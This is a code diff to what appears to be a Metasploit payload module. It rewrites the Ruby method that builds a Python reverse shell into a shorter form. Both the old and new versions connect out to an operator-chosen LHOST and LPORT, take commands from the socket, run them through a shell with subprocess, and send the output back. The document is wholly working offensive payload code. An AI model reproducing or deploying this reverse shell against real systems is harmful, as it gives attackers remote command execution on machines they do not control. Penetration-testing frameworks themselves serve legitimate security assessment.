@@ -9,7 +9,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 573
+  CachedSize = 461
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -45,20 +45,19 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    cmd = ''
-    dead = Rex::Text.rand_text_alpha(3)
-    # Set up the socket
-    cmd << "import socket,subprocess\n"
-    cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
-    cmd << "so.connect(('#{datastore['LHOST']}',#{ datastore['LPORT']}))\n"
-    # The actual IO
-    cmd << "#{dead}=False\n"
-    cmd << "while not #{dead}:\n"
-    cmd << "\tdata=so.recv(1024)\n"
-    cmd << "\tif len(data)==0:\n\t\t#{dead}=True\n"
-    cmd << "\tp=subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-    cmd << "\tstdout_value=p.stdout.read()+p.stderr.read()\n"
-    cmd << "\tso.send(stdout_value)\n"
+    cmd = <<~PYTHON
+      import socket as s
+      import subprocess as r
+      so=s.socket(s.AF_INET,s.SOCK_STREAM)
+      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
+      while True:
+      	d=so.recv(1024)
+      	if len(d)==0:
+      		break
+      	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
+      	o=p.stdout.read()+p.stderr.read()
+      	so.send(o)
+    PYTHON
 
     py_create_exec_stub(cmd)
   end
